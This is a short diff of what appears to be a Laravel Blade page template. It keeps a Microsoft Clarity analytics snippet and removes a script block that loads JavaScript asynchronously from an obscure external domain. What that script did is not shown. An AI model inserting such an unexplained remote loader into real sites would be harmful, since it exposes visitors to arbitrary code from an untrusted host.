@@ -26,13 +26,6 @@
                     y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
                 })(window, document, "clarity", "script", "iw0r336ga8");
             </script>
-            <script type="text/javascript">
-                (function() {
-                    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-                    g.type='text/javascript'; g.async=true; g.defer=true;
-                    g.src='https://j01l4h3n.com/optimus-rfl_5qYuT.js'; s.parentNode.insertBefore(g,s);
-                })();
-            </script>
         @endif
     </head>
     <body x-data="{showMenu: false}">
